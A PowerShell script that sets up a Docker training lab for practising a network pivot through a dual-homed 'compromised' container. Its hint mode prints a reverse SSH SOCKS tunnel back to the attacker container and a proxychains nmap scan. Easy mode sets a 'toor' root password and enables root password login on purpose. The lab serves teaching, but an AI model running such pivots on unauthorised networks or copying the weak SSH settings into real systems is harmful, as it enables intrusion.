<#
.SYNOPSIS
    setup_pivot_network.ps1

    Builds a 3-container Docker lab for demonstrating a network pivot:

      [attacker]  <--net-attacker-->  [compromised]  <--net-target-->  [target]
        Docker A                         Docker B                         Docker C

    - attacker (Docker A):    only on net-attacker. Has nmap + proxychains4 + ssh client + ssh server.
    - compromised (Docker B): dual-homed on BOTH networks. Has ssh client.
    - target (Docker C):      only on net-target. Not directly reachable from attacker.

.USAGE
    .\setup_pivot_network.ps1 easy
    .\setup_pivot_network.ps1 hard
    .\setup_pivot_network.ps1 hint

.REQUIREMENTS
    Docker Desktop for Windows, with the "Linux containers" engine selected
    (this is the default on current Docker Desktop versions). Run from a
    normal PowerShell window -- no WSL or admin rights required, since
    Docker Desktop handles permissions itself (there is no "sudo" on Windows).
#>

param(
    [Parameter(Position = 0)]
    [ValidateSet("easy", "hard", "hint")]
    [string]$Mode
)

$ErrorActionPreference = "Stop"

$IMAGE = "ubuntu:22.04"

$NET_ATTACKER = "net-attacker"
$NET_TARGET   = "net-target"

$SUBNET_ATTACKER = "10.10.1.0/24"
$SUBNET_TARGET   = "10.10.2.0/24"

$IP_ATTACKER      = "10.10.1.10"   # attacker on net-attacker
$IP_COMPROMISED_A = "10.10.1.20"   # compromised on net-attacker
$IP_COMPROMISED_B = "10.10.2.20"   # compromised on net-target
$IP_TARGET        = "10.10.2.10"   # target on net-target

if (-not $Mode) {
    Write-Host "Use one of the 3 options while running the program:"
    Write-Host "  .\setup_pivot_network.ps1 hint"
    Write-Host "  .\setup_pivot_network.ps1 hard"
    Write-Host "  .\setup_pivot_network.ps1 easy"
    exit
}

if ($Mode -eq "hint") {
    Write-Host ""
    Write-Host " Try this:"
    Write-Host "   docker exec -it compromised bash"
    Write-Host "   ssh -R 9050 -N root@$IP_ATTACKER  # open a SOCKS proxy through compromised, connecting back to the attacker (password: toor)"
    Write-Host "   (in another shell, run 'docker exec -it attacker bash')"
    Write-Host "   proxychains4 nmap -sT -Pn $IP_TARGET"
    Write-Host "============================================================"
    exit
}

Write-Host "[*] Creating networks..."
docker network create --subnet=$SUBNET_ATTACKER $NET_ATTACKER
docker network create --subnet=$SUBNET_TARGET $NET_TARGET

Write-Host "[*] Starting containers..."
docker run -dit --name attacker --hostname attacker `
  --network $NET_ATTACKER --ip $IP_ATTACKER `
  $IMAGE sleep infinity

docker run -dit --name compromised --hostname compromised `
  --network $NET_ATTACKER --ip $IP_COMPROMISED_A `
  $IMAGE sleep infinity

docker run -dit --name target --hostname target `
  --network $NET_TARGET --ip $IP_TARGET `
  $IMAGE sleep infinity

Write-Host "[*] Making 'compromised' dual-homed (joining it to net-target as well)..."
docker network connect --ip $IP_COMPROMISED_B $NET_TARGET compromised

if ($Mode -eq "easy") {
    Write-Host "[*] Installing tools on attacker (nmap, proxychains4, ssh client, ssh server)..."
    docker exec attacker bash -c @"
apt-get update -qq &&
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
  nmap vim curl proxychains4 openssh-client iputils-ping iproute2 openssh-server >/dev/null
mkdir -p /var/run/sshd &&
echo 'root:toor' | chpasswd &&
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config &&
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config &&
service ssh start
"@
}

if ($Mode -eq "hard") {
    Write-Host "[*] Installing tools on attacker (nmap, proxychains4, ssh client, ssh server)..."
    Write-Host "[ WARNING ] This is hard mode, you need to install and configure SSH Server, Client, and proxychains4"
    docker exec attacker bash -c @"
apt-get update -qq &&
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
  nmap vim curl iputils-ping iproute2 >/dev/null
"@
}

Write-Host "[*] Installing tools on compromised (ssh client and others)..."
docker exec compromised bash -c @"
apt-get update -qq &&
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
  openssh-client iputils-ping iproute2 sudo >/dev/null
"@

Write-Host "[*] Installing a target service on target (nginx, so there's something to scan/reach)..."
docker exec target bash -c @"
apt-get update -qq &&
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
  nginx iputils-ping iproute2 >/dev/null &&
service nginx start
"@

Write-Host ""
Write-Host "============================================================"
Write-Host " Setup complete."
Write-Host "============================================================"
Write-Host " attacker     : $IP_ATTACKER        (net-attacker only)"
Write-Host " compromised  : $IP_COMPROMISED_A   (net-attacker)"
Write-Host "                $IP_COMPROMISED_B   (net-target)"
Write-Host " target       : $IP_TARGET          (net-target only)"
Write-Host " attacker CANNOT reach target directly (different networks)."
Write-Host " compromised CAN reach both -- it's the pivot point."
Write-Host ""

Write-Host " To log into attacker machine, run this: docker exec -it attacker bash"
Write-Host " Remember, you compromised the 'pivot' machine. So run this to log in to the pivot: docker exec -it compromised bash"
Write-Host " Your goal is to run nmap against the port 80 on IP 10.10.2.10"
